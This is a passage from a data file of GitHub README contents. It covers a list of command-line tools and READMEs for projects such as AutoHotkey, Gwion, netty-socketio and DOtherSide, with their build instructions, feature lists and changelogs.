[fzf](https:\/\/github.com\/junegunn\/fzf) - A general-purpose command-line fuzzy finder.\n- [Marker](https:\/\/github.com\/pindexis\/marker) - The terminal command palette.\n- [MultiTail](https:\/\/www.vanheusden.com\/multitail\/) - Monitor logfiles and command output in multiple windows in a terminal, colorize, filter and merge.\n- [PathPicker](https:\/\/facebook.github.io\/PathPicker\/) - After parsing the output from a command, PathPicker presents you with a nice UI to select which files you're interested in.\n- [pick](https:\/\/github.com\/calleerlandsson\/pick) - Fuzzy select anything.\n- [SCREEN](http:\/\/www.guckes.net\/Screen\/) - A \"window manager\" for the console and terminals.\n- [tmux](https:\/\/tmux.github.io) - A terminal multiplexer.\n- [yank](https:\/\/github.com\/mptre\/yank) - Yank terminal output to clipboard.\n- [z](https:\/\/github.com\/rupa\/z) - Tracks your most used directories, based on 'frecency'.\n\n### Text Editors\n\n- [Diakonos](http:\/\/diakonos.pist0s.ca) - A linux editor for the masses.\n- [Emacs](https:\/\/www.gnu.org\/software\/emacs\/) - An extensible, customizable text editor.\n- [Kakoune](http:\/\/kakoune.org) - Modal editor with multiple selections and orthogonal design.\n- [Neovim](https:\/\/neovim.io) - Modern version of the Vim editor with many advanced features.\n- [Vim](http:\/\/www.vim.org) - Advanced text editor that seeks to provide the power of the de-facto Unix editor 'Vi', with a more complete feature set.\n- [Vis](https:\/\/github.com\/martanne\/vis) - A highly efficient text editor.\n\n### Version Control\n\n- [Bazaar](http:\/\/bazaar.canonical.com\/en\/) - Easily manage source code on Windows, Ubuntu, GNU\/Linux, and Mac OS X.\n- [fossil](https:\/\/fossil-scm.org) - Simple, high-reliability, distributed SCM with integrated bug tracking, wiki, forum, and technotes.\n- [Git](https:\/\/www.git-scm.com) - Git is a free and open source distributed version control system.\n- [gitfs](https:\/\/www.presslabs.com\/gitfs\/) - Version controlled file system.\n- [grv](https:\/\/github.com\/rgburke\/grv) - ncurses based text-mode Git repository browser.\n- [Mercurial](https:\/\/www.mercurial-scm.org) - Free, distributed source control management tool.\n- [tig](https:\/\/github.com\/jonas\/tig) - ncurses based text-mode interface for Git.\n\n### VPN\n\n- [OpenVPN](https:\/\/openvpn.net\/index.php\/open-source.html) - Full-featured open source SSL VPN solution.\n- [racoon](http:\/\/ipsec-tools.sourceforge.net) - Internet Key Exchange (IKE) daemon for automatically keying IPsec connections.\n- [strongSwan](https:\/\/www.strongswan.org\/) - Open Source IPsec for Linux.\n\n### World Wide Web\n\n- [ELinks](http:\/\/elinks.or.cz) - Advanced and well-established feature-rich text mode web (HTTP\/FTP\/..) browser.\n- [GoAccess](https:\/\/goaccess.io) - Real-time visual web log analyzer and interactive viewer.\n- [googler](https:\/\/github.com\/jarun\/googler) - Google Search, Google Site Search, Google News from the terminal.\n- [pageres](https:\/\/github.com\/sindresorhus\/pageres) - Capture screenshots of websites in various resolutions.\n\n\n## BSD\n\n- [ezjail](http:\/\/erdgeist.org\/arts\/software\/ezjail\/) - Jail administration framework.\n- [iocage](https:\/\/iocage.io) - Convenient, Lightweight & Easy Container Management for jails.\n- [pkgsrc](http:\/\/www.pkgsrc.org) - Portable package build system.\n- [poudriere](https:\/\/github.com\/freebsd\/poudriere) - Port\/Package build and test system.\n\n## Linux\n\n- [aptly](https:\/\/www.aptly.info\/) -  Swiss army knife for Debian repository management.\n- [btrfs](https:\/\/btrfs.wiki.kernel.org\/index.php\/Main_Page) - Copy on write (CoW) filesystem for Linux aimed at implementing advanced features while focusing on fault tolerance, repair and easy administration.\n- [deborphan](http:\/\/freecode.com\/projects\/deborphan) - Finds packages installed on your Debian\/GNU system that have no other packages depending on them.\n- [IPTraf](http:\/\/iptraf.seul.org) - Console-based network statistics utility for Linux.\n\n\n## Mac OS X\n\n- [Fink](http:\/\/www.finkproject.org) - The full world of Unix Open Source software for Darwin.\n- [Homebrew](http:\/\/brew.sh) - The missing package manager for OS X.\n- [itunes-remote](https:\/\/github.com\/mischah\/itunes-remote) - Control iTunes via CLI.\n- [MacPorts](https:\/\/www.macports.org) - Compile, install and upgrade either command-line, X11 or Aqua based open-source software.\n- [mas](https:\/\/github.com\/mas-cli\/mas) - Mac App Store command line interface.\n- [Night Shift Shell Utility](https:\/\/github.com\/jenghis\/nshift) - Simple shell utility to control the macOS Night Shift feature.\n- [reminders-cli](https:\/\/github.com\/keith\/reminders-cli) - A simple CLI for interacting with Reminders.\n- [tag](https:\/\/github.com\/jdberry\/tag) - Manipulate tags on files and query for files with those tags.\n- [XLD](http:\/\/tmkk.undo.jp\/xld\/index_e.html) - Tool to decode\/convert\/play various 'lossless' audio files.\n\n\n## Helpers\n\n- [crontab.guru](http:\/\/crontab.guru) - Cron schedule expression editor.\n\n\n## License\n\n<a rel=\"license\" href=\"https:\/\/creativecommons.org\/licenses\/by-sa\/4.0\/\"><img alt=\"Creative Commons License\" style=\"border-width:0\" src=\"https:\/\/licensebuttons.net\/l\/by-sa\/4.0\/88x31.png\" \/><\/a><br \/>This work is licensed under a <a rel=\"license\" href=\"https:\/\/creativecommons.org\/licenses\/by-sa\/4.0\/\">Creative Commons Attribution-ShareAlike 4.0 International License<\/a>.\n"},{"repo":"\/AutoHotkey\/AutoHotkey","language":"C++","readme_contents":"# AutoHotkey\nAutoHotkey is a powerful and easy to use scripting language for desktop automation on Windows.  \nhttp:\/\/autohotkey.com\/\n\n----\n\n### AutoHotkey v1.1\nIn late 2012, after consultation with the community, AutoHotkey_L became the official branch.  \nIt's source code can be found here: https:\/\/github.com\/Lexikos\/AutoHotkey_L  \nalong with the documentation here: https:\/\/github.com\/Lexikos\/AutoHotkey_L-Docs  \n"},{"repo":"\/StanzaOrg\/lbstanza","language":"C","readme_contents":"# L.B. Stanza Programming Language\n\nL.B. Stanza (or Stanza for short) is a new optionally-typed general purpose programming language designed to help programmers tackle the complexity of architecting large programs and significantly increase the productivity of application programmers across the entire software development life cycle.\n\nVisit www.lbstanza.org for details.\n"},{"repo":"\/daw42\/glslcookbook","language":"C","readme_contents":"\n:tada: **NEW** *The [3rd Edition is now available][cookbookv3]!!!* :tada:\n\nExample code from the [OpenGL Shading Language Cookbook, 2nd Edition][cookbook]\n=========================================================\n\nThe example code from the [OpenGL Shading Language Cookbook, 2nd Edition][cookbook],\nby David Wolff and published by Packt Publishing, 2013 (ISBN: 9781782167020).\n\nRecent changes:\n * Most examples now run on MacOS!\n * CMake build now uses package config files when finding GLM and GLFW.  This should make for a more\n streamlined configuration.  Use [`CMAKE_PREFIX_PATH`][cmake_prefix] to point CMake to your installs.\n * Examples now properly support high-density displays.\n\nRequirements\n-------------\nTo compile these examples, you'll need the following:\n\n* The [GLM Mathematics Library][GLM] version 0.9.6 or later.  Note that versions\n  prior to 0.9.6 may not work properly because of a switch from degrees to\n  radians.  GLM 0.9.5 will work, but you'll need to add `#define GLM_FORCE_RADIANS`\n  prior to including the glm header files.\n* [GLFW][] version 3.0 or later.\n\nCompiling the examples\n----------------------\nThe example code builds with [CMake][].  Note that the\nexamples for Chapter 10 will not function on MacOS due to lack of support for\ncompute shaders on that platform.\n\n1.  Install [GLFW][] by following the instructions on their [web site][GLFW].\n2.  Install the latest version of [GLM][].  Note that for [CMake][] to find GLM\n    correctly, you need to run the install \"build\" (e.g. `make install`) or install GLM from your\n    favorite package manager.  Otherwise, the CMake config files will not be created\/available.\n3.  Download this example code from [github][ghcookbook], or clone using git.\n4.  Run cmake.  If cmake has difficulties finding the GLFW or GLM installations,\n    set the variable [`CMAKE_PREFIX_PATH`][cmake_prefix] to help cmake find them.\n5.  Compile by running `make`.\n\nAny problems, [create an issue](https:\/\/github.com\/daw42\/glslcookbook\/issues) on [github][ghcookbook].\n\nTips for compiling for Windows with Visual Studio\n---------------------------------------------\n* Use the Visual Studio target in [CMake][]:  `-G \"Visual Studio...\"`, open the\n  Visual Studio solution.  You should see one project per chapter.\n* Each chapter requires a command line argument to choose a recipe.  When\n  running in VS, be sure to set the 'Command Argument' under 'Properties' for\n  the appropriate recipe.\n\nOpenGL Function Loading\n-----------------------\n\nAn OpenGL header file and a function loader for a 4.3 core profile are\nincluded with this project.  They were generated using\n[GLAD][].  This loader should also work on MacOS under a 4.1 core profile, but of course not all functions will load.\n\nThe code has been tested with OpenGL 4.3 on Windows\/Linux and OpenGL 4.1 on MacOS.\n\n[GLM]: http:\/\/glm.g-truc.net\n[GLFW]:  http:\/\/glfw.org\n[ghcookbook]:  http:\/\/github.com\/daw42\/glslcookbook\n[cookbook]: http:\/\/www.packtpub.com\/opengl-4-shading-language-cookbook-second-edition\/book\n[cookbookv3]: https:\/\/github.com\/PacktPublishing\/OpenGL-4-Shading-Language-Cookbook-Third-Edition\n[GLLoadGen]:  https:\/\/bitbucket.org\/alfonse\/glloadgen\/wiki\/Home\n[CMake]: http:\/\/www.cmake.org\/\n[GLAD]: https:\/\/github.com\/Dav1dde\/glad\n[cmake_prefix]: https:\/\/cmake.org\/cmake\/help\/latest\/variable\/CMAKE_PREFIX_PATH.html\n"},{"repo":"\/fennecdjay\/Gwion","language":"C","readme_contents":"# Gwion\n\n[![Build Status](https:\/\/travis-ci.org\/fennecdjay\/Gwion.svg?branch=master)](https:\/\/travis-ci.org\/fennecdjay\/Gwion)\n[![Language grade: C\/C++](https:\/\/img.shields.io\/lgtm\/grade\/cpp\/g\/fennecdjay\/Gwion.svg?logo=lgtm&logoWidth=18)](https:\/\/lgtm.com\/projects\/g\/fennecdjay\/Gwion\/context:cpp)\n[![CII Best Practices](https:\/\/bestpractices.coreinfrastructure.org\/projects\/2417\/badge)](https:\/\/bestpractices.coreinfrastructure.org\/projects\/2417)\n[![Coveralls branch](https:\/\/img.shields.io\/coveralls\/fennecdjay\/Gwion\/master.svg)](https:\/\/coveralls.io\/github\/fennecdjay\/Gwion?branch=master)\n[![All Contributors](https:\/\/img.shields.io\/badge\/all_contributors-3-orange.svg)](#contributors)\n[![BCH compliance](https:\/\/bettercodehub.com\/edge\/badge\/fennecdjay\/Gwion?branch=master)](https:\/\/bettercodehub.com\/)\n\nGwion is a programming language, aimed at making music\n\n**strongly** inspired by [chuck](http:\/\/chuck.stanford.edu\/), but adding a bunch *high-level* features:  \n\t  templating, first-class functions and more.  \n<!-- TODO: add benchmarks in doc and link to it -->\nIt aims to be simple, small,\n [fast](https:\/\/fennecdjay.github.io\/Gwion\/#Benchmarks\/),\n [extendable](https:\/\/github.com\/fennecdjay\/Gwion-plug) and [embeddable](https:\/\/github.com\/fennecdjay\/Gwion\/blob\/master\/src\/main.c#L18-L31).\n\n### simple example code (hello_world.gw):\n\n```cpp\n\/\/ print hello world\n<<< \"Hello World\" >>>;\n```\nto run this, do\n\n```sh\n.\/gwion hello_world.gw\n```\nYou want to know more? :smile: Look [here](https:\/\/fennecdjay.github.io\/Gwion\/)\nBoth outdated and WIP :construction_worker: but a nice place to learn and [contribute](https:\/\/github.com\/fennecdjay\/gwion\/issues)\n\n## Build\n### Download the source\nYou might just want the minimum to start with, try\n``` sh\ngit clone https:\/\/github.com\/fennecdjay\/Gwion\ncd Gwion\ngit submodule update --init util ast\nmake\n```\n\nYou can get a list of config files to tweak with\n``` sh\nfind . -name \"config.mk\"\n```\n> Besides develloper options, you migth want to check *USE_DOUBLE*, in util\/config.mk, which set the floating point size (float or double).\n\n## Reporting bugs \/ Contributing\n\n:+1: Every helping hand is welcome!!! :+1:  \n\nIf there's anything you see that can make Gwion better, please let us know!\n\n:book: Please see the [contributing](.github\/CONTRIBUTING.md) page for more information.\n\n## Acknowledgements.\nThe whole [Chuck](http:\/\/chuck.cs.princeton.edu\/) team, for inspiration.  \n[Paul Batchelor](https:\/\/github.com\/PaulBatchelor) and the awesome [soundpipe](https:\/\/github.com\/PaulBatchelor\/Soundpipe) library, that got me started.\n\n## Contributors\n\nThanks goes to these wonderful people ([emoji key](https:\/\/github.com\/kentcdodds\/all-contributors#emoji-key)):\n<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->\n<!-- prettier-ignore -->\n<table><tr><td align=\"center\"><a href=\"http:\/\/paulbatchelor.github.io\"><img src=\"https:\/\/avatars3.githubusercontent.com\/u\/8139389?v=4\" width=\"100px;\" alt=\"Paul Batchelor\"\/><br \/><sub><b>Paul Batchelor<\/b><\/sub><\/a><br \/><a href=\"#question-PaulBatchelor\" title=\"Answering Questions\">\ud83d\udcac<\/a> <a href=\"https:\/\/github.com\/fennecdjay\/Gwion\/issues?q=author%3APaulBatchelor\" title=\"Bug reports\">\ud83d\udc1b<\/a> <a href=\"https:\/\/github.com\/fennecdjay\/Gwion\/commits?author=PaulBatchelor\" title=\"Code\">\ud83d\udcbb<\/a> <a href=\"#ideas-PaulBatchelor\" title=\"Ideas, Planning, & Feedback\">\ud83e\udd14<\/a><\/td><td align=\"center\"><a href=\"https:\/\/github.com\/originalsouth\"><img src=\"https:\/\/avatars1.githubusercontent.com\/u\/5300799?v=4\" width=\"100px;\" alt=\"Benny\"\/><br \/><sub><b>Benny<\/b><\/sub><\/a><br \/><a href=\"#question-originalsouth\" title=\"Answering Questions\">\ud83d\udcac<\/a> <a href=\"https:\/\/github.com\/fennecdjay\/Gwion\/issues?q=author%3Aoriginalsouth\" title=\"Bug reports\">\ud83d\udc1b<\/a> <a href=\"https:\/\/github.com\/fennecdjay\/Gwion\/commits?author=originalsouth\" title=\"Code\">\ud83d\udcbb<\/a><\/td><td align=\"center\"><a href=\"https:\/\/github.com\/scalarwaves\"><img src=\"https:\/\/avatars1.githubusercontent.com\/u\/4212896?v=4\" width=\"100px;\" alt=\"Andrew Prentice\"\/><br \/><sub><b>Andrew Prentice<\/b><\/sub><\/a><br \/><a href=\"#question-scalarwaves\" title=\"Answering Questions\">\ud83d\udcac<\/a> <a href=\"https:\/\/github.com\/fennecdjay\/Gwion\/issues?q=author%3Ascalarwaves\" title=\"Bug reports\">\ud83d\udc1b<\/a> <a href=\"https:\/\/github.com\/fennecdjay\/Gwion\/commits?author=scalarwaves\" title=\"Code\">\ud83d\udcbb<\/a> <a href=\"#ideas-scalarwaves\" title=\"Ideas, Planning, & Feedback\">\ud83e\udd14<\/a><\/td><\/tr><\/table>\n\n<!-- ALL-CONTRIBUTORS-LIST:END -->\nThis project follows the [all-contributors](https:\/\/github.com\/kentcdodds\/all-contributors) specification. Contributions of any kind welcome!\n\n>    NOTE: if you should be on the list of contributors but we forgot you, don't be shy and let us know!\n"},{"repo":"\/mrniko\/netty-socketio","language":"Java","readme_contents":"Netty-socketio Overview\n===\nThis project is an open-source Java implementation of [Socket.IO](http:\/\/socket.io\/) server. Based on [Netty](http:\/\/netty.io\/) server framework.  \n\nCheckout [Demo project](https:\/\/github.com\/mrniko\/netty-socketio-demo)\n\nLicensed under the Apache License 2.0.\n\n\nFeatures\n================================\n* Supports __0.7__...__0.9.16__ (netty-socketio 1.6.6) and __1.0+__ (netty-socketio latest version) version of [Socket.IO-client](https:\/\/github.com\/LearnBoost\/socket.io-client)  \n* Supports xhr-polling transport  \n* Supports websocket transport  \n* Supports namespaces and rooms  \n* Supports ack (acknowledgment of received data)  \n* Supports SSL  \n* Supports client store (Memory, [Redisson](http:\/\/redisson.org), [Hazelcast](http:\/\/www.hazelcast.com\/))  \n* Supports distributed broadcast across netty-socketio nodes ([Redisson](http:\/\/redisson.org), [Hazelcast](http:\/\/www.hazelcast.com\/))  \n* Supports OSGi  \n* Supports Spring  \n* Lock-free and thread-safe implementation  \n* Declarative handler configuration via annotations  \n\n\nPerformance\n================================\n\nCustomer feedback in __2012__:  \nCentOS, 1 CPU, 4GB RAM runned on VM: \nCPU 10%, Memory 15%  \n6000 xhr-long polling sessions or 15000 websockets sessions  \n4000 messages per second  \n\n\nCustomer feedback in __2014__:  \n\"To stress test the solution we run 30 000 simultaneous websocket clients and managed to peak at total of about 140 000 messages per second with less than 1 second average delay.\" (c) Viktor Endersz - Kambi Sports Solutions\n\nProjects using netty-socketio\n================================\nAVOS Cloud: [avoscloud.com](https:\/\/avoscloud.com\/)  \nBingo Crack: [bingocrack.com](http:\/\/bingocrack.com\/)  \nKambi Sports Solutions: [kambi.com](http:\/\/kambi.com\/)  \nARSnova: [arsnova.eu](https:\/\/arsnova.eu)  \nZipwhip: [zipwhip.com](https:\/\/zipwhip.com\/)\n\nRecent Releases\n================================\n#### Please Note: trunk is current development branch.\n\n#### 11-Jan-2019 - version 1.7.17 released  \nFeature - randomSession setting added to Config object (thanks to yuanxiangz)  \nFixed - NPE in WebSocketTransport  \nFixed - NPE & memory leak (thanks to zhaolianwang)  \nFixed - namespace parsing (thanks to Redliver)  \nFixed - Redisson 3.9+ compatibility  \n\n#### 06-Jul-2018 - version 1.7.16 released  \nFixed - non thread-safe ACK handling (thanks to dawnbreaks)  \nFixed - inactive long-polling channels cause memory leak (thanks to dawnbreaks)  \nFixed - websocket CloseFrame processing (thanks to hangsu.cho)  \nFixed - WebSocketTransport NPE  \n\n#### 15-May-2018 - version 1.7.15 released  \n\nFixed - Session ID is not unique anymore  \nFixed - fixed underlying connection not closing on ping timeout  \nFixed - the \"fin_close\" problem  \n\n#### 26-Feb-2018 - version 1.7.14 released  \nFeature - added local socket address for the connection (thanks to @SergeyGrigorev)  \nFeature - `addPingListener` method added (thanks to @lovebing)  \nFeature - add ThreadFactory for HashedWheelTimer (thanks to @hand515)  \nFixed - changed SO_LINGER to be handled as child channel (not server channel) option (thanks to @robymus)  \nFixed - ByteBuf leak if binary attachments are used  \nFixed - restore session from Cookie (thanks to @wuxudong)  \nFixed - NumberFormatException when b64 is bool value (thanks to @vonway)  \nFixed - data encoding for polling transport  \n\n#### 20-Sep-2017 - version 1.7.13 released  \nFeature - Added option to change the SSL KeyFactoryAlgorithm using Configuration (thanks to @robymus)  \nImprovement - Binary ack handling improvements (thanks to Sergey Bushik)  \nFixed - Failed to mark a promise as success because it has succeeded already (thanks to @robymus)\n\n#### 27-Aug-2016 - version 1.7.12 released  \nFeature - `SocketIOServer.removeAllListeners` method added  \nFeature - `BroadcastOperations.sendEvent` method with `excludedClient` param added  \nImprovement - Redisson updated to 2.4.0  \nFixed - memory leak in Namespace object (thanks to @CrazyIvan007)  \n\n\n#### 13-Jul-2016 - version 1.7.11 released  \nFixed - Throw error if transport not supported  \nFixed - Client disconnecting when using Polling - IndexOutOfBoundsException  \n\n#### 4-Mar-2016 - version 1.7.10 released  \nFixed - netty updated to 4.1.0.CR3 version  \nFixed - binary packet parsing (thanks to Winston Li)  \n\n#### 6-Feb-2016 - version 1.7.9 released  \nFeature - Compression support  \nFixed - DotNET client request handling  \nFixed - Packet length format parsing  \nFixed - skipping 'd=' in packet  \nFixed - Polling clients sporadically get prematurely disconnected (thanks to lpage30)  \nFixed - connections stay open forever if server sent `close` packet  \nFixed - compatibility with Redisson latest version  \n\n#### 30-Nov-2015 - version 1.7.8 released  \nImprovement - `WebSocketServerHandshaker.allowExtensions` is `true` now  \nImprovement - SessionID cookie implementation (thanks to @ryandietrich)  \nFixed - clientRooms leak (thanks to @andreaspalm)  \nFixed - ExceptionListener not used for errors in JSON parsing  \nFixed - \"silent channel\" attack    \n\n#### 26-Mar-2015 - version 1.6.7 released  \nImprovement - `useStrictOrdering` param added for websocket packets strict ordering  \nImprovement - `FAIL_ON_EMPTY_BEANS = false` option setted in json decoder  \n\n#### 18-Feb-2015 - version 1.7.7 released  \nImprovement - no need to add jackson lib if you use own JsonSupport impl    \nFixed - SocketIO client 1.3.x support  \nFixed - Charset encoding handling (thanks to  alim-akbashev)  \n\n#### 17-Jan-2015 - version 1.7.6 released  \nImprovement - `SocketIONamespace.getName()` added  \nFixed - WebSocket frames aggregation  \nFixed - WebSocket buffer release  \nFixed - `Unexpected end-of-input in VALUE_STRING` error  \nFixed - Access-Control-Allow-Credentials is TRUE for requests with origin header  \n\n#### 05-Dec-2014 - version 1.7.5 released  \nFeature - `Configuration.sslProtocol` param added  \nFixed - BinaryEvent ack handling  \nFixed - BinaryEvent non b64 encoding\/decoding  \nFixed - buffer leak during packet encoding  \n\n#### 15-Nov-2014 - version 1.7.4 released  \nFixed - packet encoding  \nFixed - BinaryEvent encoding\/decoding  \nFixed - unchallenged connections handling  \n\n#### 29-Sep-2014 - version 1.6.6 released  \nFeature - `origin` setting added  \nFeature - `crossDomainPolicy` setting added  \nFeature - `SocketIOServer.startAsync` method added  \n\n#### 24-Sep-2014 - version 1.7.3 released  \nFeature - Epoll support  \nImprovement - BinaryEvent support  \nFixed - SocketIOClient disconnect handling  \nFixed - broadcast callback  \nFixed - NPE then no transport defined during auth  \nFixed - ping timeout for polling transport  \nFixed - buffer leak in PacketEncoder  \n\n#### 22-Aug-2014 - version 1.7.2 released  \nFixed - wrong outgoing message encoding using websocket transport  \nFixed - NPE in websocket transport  \nFixed - multiple packet decoding in polling transport  \nFixed - buffer leak  \n\n#### 07-Jul-2014 - version 1.7.1 released  \nFeature - ability to set custom `Access-Control-Allow-Origin` via Configuration.origin  \nFixed - connection via CLI socket.io-client  \n\n#### 28-Jun-2014 - version 1.7.0 released\nFeature - Socket.IO 1.0 protocol support. Thanks to the new protocol decoding\/encoding has speedup  \n__Dropped__ - `SocketIOClient.sendMessage`, `SocketIOClient.sendJsonObject` methods and corresponding listeners  \n__Dropped__ - Flashsocket transport support  \n__Dropped__ - protocol version 0.7 ... 0.9.16  \n\n#### 13-May-2014 - version 1.6.5 released\nImprovement - single packet encoding optimized, used mostly in WebSocket transport. Encoding time reduced up to 40% (thanks to Viktor Endersz)  \nImprovement - rooms handling optimized  \nImprovement - ExceptionListener.exceptionCaught method added  \n__Breaking api change__ - Configuration.autoAck replaced with ackMode  \nFeature - trustStore setting added  \nFeature - maxFramePayloadLength setting added  \nFeature - getAllClients and getClient methods added to SocketIONamespace  \nFixed - SocketIOServer.getAllClients returns wrong clients amount  \n\n#### 25-Mar-2014 - version 1.6.4 released\nFixed - message release problem  \nFixed - problem with exception listener configuration redefinition  \n__Breaking api change__ - DataListener.onData now throws Exception  \nImprovement - data parameter added to exception listener  \nImprovement - ability to setup socket configuration  \nImprovement - Configuration.autoAck parameter added  \n\n#### 06-Mar-2014 - version 1.6.3 released\nFixed - AckCallback handling during client disconnect  \nFixed - unauthorized handshake HTTP code changed to 401  \n__Breaking api change__ - Configuration.heartbeatThreadPoolSize setting removed  \nFeature - annotated Spring beans support via _SpringAnnotationScanner_  \nFeature - common exception listener  \nImprovement - _ScheduledExecutorService_ replaced with _HashedWheelTimer_  \n\n#### 08-Feb-2014 - version 1.6.2 released\nFixed - wrong namespace client disconnect handling  \nFixed - exception in onConnect\/onDisconnect\/isAuthorized methods leads to server hang  \n__Breaking api change__ - SocketIOClient.sendEvent methods signature changed  \nImprovement - multi type events support via _MultiTypeEventListener_ and _OnEvent_ annotation  \nImprovement - multi type events ack support via _MultiTypeAckCallback_  \nImprovement - SocketIOClient.getHandshakeData method added  \nImprovement - Jedis replaced with [Redisson](https:\/\/github.com\/mrniko\/redisson)  \n\n#### 14-Jan-2014 - version 1.6.1 released\nFixed - JDK 1.6+ compatibility  \nFeature - authorization support  \n\n#### 19-Dec-2013 - version 1.6.0 released\nFixed - XHR-pooling transport regression  \nFixed - Websocket transport regression  \nFixed - namespace NPE in PacketHandler  \nFixed - executors shutdown during server stop  \nFeature - client store (Memory, [Redis](http:\/\/redis.io\/), [Hazelcast](http:\/\/www.hazelcast.com\/)) support  \nFeature - distributed broadcast across netty-socketio nodes ([Redis](http:\/\/redis.io\/), [Hazelcast](http:\/\/www.hazelcast.com\/)) support  \nFeature - OSGi support (thanks to rdevera)  \nImprovement - XHR-pooling optimization  \nImprovement - SocketIOClient.getAllRooms method added\n\n#### 07-Dec-2013 - version 1.5.4 released\nFixed - flash policy \"request leak\" after page reload (thanks to ntrp)  \nFixed - websocket swf loading (thanks to ntrp)  \nFixed - wrong urls causes a potential DDoS  \nFixed - Event.class package visibility changed to avoid direct usage  \nImprovement - Simplified Jackson modules registration\n\n#### 24-Oct-2013 - version 1.5.2 released\nFixed - NPE during shutdown  \nImprovement - isEmpty method added to Namespace\n\n#### 13-Oct-2013 - version 1.5.1 released\nFixed - wrong ack timeout callback invocation  \nFixed - bigdecimal serialization for JSON  \nFixed - infinity loop during packet handling exception  \nFixed - 'client not found' handling  \n\n#### 27-Aug-2013 - version 1.5.0 released\nImprovement - encoding buffers allocation optimization.  \nImprovement - encoding buffers now pooled in memory to reduce GC pressure (netty 4.x feature).  \n\n#### 03-Aug-2013 - version 1.0.1 released\nFixed - error on unknown property during deserialization.  \nFixed - memory leak in long polling transport.  \nImprovement - logging error info with inbound data.\n \n#### 07-Jun-2013 - version 1.0.0 released\nFirst stable release.\n\n\n### Maven \n\nInclude the following to your dependency list:\n\n    <dependency>\n     <groupId>com.corundumstudio.socketio<\/groupId>\n     <artifactId>netty-socketio<\/artifactId>\n     <version>1.7.12<\/version>\n    <\/dependency>\n    \n### Supported by\n\nYourKit is kindly supporting this open source project with its full-featured Java Profiler.\nYourKit, LLC is the creator of innovative and intelligent tools for profiling\nJava and .NET applications. Take a look at YourKit's leading software products:\n<a href=\"http:\/\/www.yourkit.com\/java\/profiler\/index.jsp\">YourKit Java Profiler<\/a> and\n<a href=\"http:\/\/www.yourkit.com\/.net\/profiler\/index.jsp\">YourKit .NET Profiler<\/a>.\n"},{"repo":"\/filcuc\/DOtherSide","language":"C++","readme_contents":"# DOtherSide\n[![License](https:\/\/img.shields.io\/badge\/license-LGPL-green.svg)](https:\/\/github.com\/filcuc\/DOtherSide\/blob\/master\/LICENSE)\n[![Build Status](https:\/\/travis-ci.org\/filcuc\/DOtherSide.svg?branch=master)](https:\/\/travis-ci.org\/filcuc\/DOtherSide)\n[![Build status](https:\/\/ci.appveyor.com\/api\/projects\/status\/ufufhtv2h507sd96\/branch\/master?svg=true)](https:\/\/ci.appveyor.com\/project\/filcuc\/dotherside\/branch\/master)\n[![codecov](https:\/\/codecov.io\/gh\/filcuc\/dotherside\/branch\/master\/graph\/badge.svg)](https:\/\/codecov.io\/gh\/filcuc\/dotherside)\n[![Documentation Status](https:\/\/img.shields.io\/badge\/read-documentation-blue.svg)](https:\/\/filcuc.github.io\/DOtherSide\/)\n\nC language library for creating bindings for the Qt QML language.\n\nDocumentation: https:\/\/filcuc.github.io\/DOtherSide\/index.html\n\nCurrently the DOtherSide library is used by the following bindings:\n* [nimqml](https:\/\/github.com\/filcuc\/nimqml), QML bindings for the Nim programming language\n* [dqml](https:\/\/github.com\/filcuc\/dqml), QML bindings for the D programming language\n* [qml-rust](https:\/\/github.com\/White-Oak\/qml-rust), QML bindings for the Rust programming language\n\n## Supported features\nThe following features are implementable from a binding language\n* Creating custom QObject\n* Creating custom QAbstractListModels\n* Creating custom properties, signals and slots\n* Creating from QML QObject defined in the binded language\n* Creating from Singleton QML QObject defined in the binded language\n\n## Prebuilt binaries\n### Windows\nCurrently we provide the prebuilt binaries for windows through the\ngithub [releases](https:\/\/github.com\/filcuc\/DOtherSide\/releases) page\n\n### Linux\nCurrently we provide the prebuilt binaries for the following\nLinux distributions through the [OpenSUSE OBS service](https:\/\/build.opensuse.org\/package\/show\/home:filcuc\/DOtherSide)\n* ```Archlinux``` : [here](http:\/\/software.opensuse.org\/download.html?project=home%3Afilcuc&package=DOtherSide)\n\n## Change log\nThe project change log can be read [here](.\/CHANGELOG.md).\n\n## Supported platforms\nCurrently we support the following platforms\/compilers:\n- Linux both 32\/64bit with gcc\n- Windows 32\/64bit with Visual Studio 2013|2015 Community Edition\n\n## Build requirements\nYou need the following software:\n* Qt 5.4 or higher\n* Linux: gcc 4.8 or later with c++11 support or higher\n* Windows: Visual Studio 2013|2015 Community Edition (Windows) or higher\n\n## Build instructions:\n1. Open a shell terminal inside the cloned repo\n2. mkdir build && cd build\n3. cmake ..\n4. make\n\n## Install Instructions\nOnce you built the package just type\n```\nmake install\n```\nby default cmake will install to the default CMAKE prefix.\nIf you want to customize this location type the following command\nduring the build steps when invoking cmake\n```\ncmake -DCMAKE_INSTALL_PREFIX:PATH=\/path\/to\/install\/prefix path\/to\/CMakeLists.txt\n```\n"},{"repo":"\/forhappy\/c-recipes","language":"C++","readme_contents":"c-recipes\n=========\n\nc\/c++ language useful recipes"},{"repo":"\/feelpp\/feelpp","language":"C++","readme_contents":":feelpp: Feel++\n:cpp: C++\n= {feelpp}: Finite Element Embedded Library in {cpp}\nFeel++ Consortium <https:\/\/github.com\/feelpp[@feelpp]>\n:toc: macro\n:toclevels: 2\n:uri-rel-file-base: link:\n:uri-rel-tree-base: link:\nifdef::env-site[]\n:uri-rel-file-base: {uri-repo}\/blob\/develop\/\n:uri-rel-tree-base: {uri-repo}\/tree\/develop\/\nendif::[]\nifndef::env-github[:icons: font]\nifdef::env-github[]\n:status:\n:outfilesuffix: .adoc\n:caution-caption: :fire:\n:important-caption: :exclamation:\n:note-caption: :paperclip:\n:tip-caption: :bulb:\n:warning-caption: :warning:\nendif::[]\nifdef::env-github,env-browser[:outfilesuffix: .adoc]\n\/\/ URIs:\n:uri-org: https:\/\/github.com\/feelpp\n:uri-repo: {uri-org}\/feelpp\n:uri-www: http:\/\/www.feelpp.org\n:uri-project: http:\/\/book.feelpp.org\n:uri-docs: {uri-project}\/\n:uri-news: {uri-www}\/news\n:uri-manpage: {uri-project}\/man\/asciidoctor\n:uri-help-base: https:\/\/help.github.com\/articles\n:uri-contribute: {uri-rel-file-base}CONTRIBUTING.adoc\n:uri-license: {uri-rel-file-base}LICENSE.adoc\n:uri-issues: {uri-repo}\/issues\n:uri-contributors: {uri-repo}\/graphs\/contributors\n:uri-fork-help: {uri-help-base}\/fork-a-repo\n:uri-branch-help: {uri-fork-help}#create-branches\n:uri-pr-help: {uri-help-base}\/using-pull-requests\n:uri-gist: https:\/\/gist.github.com\n:uri-freesoftware: 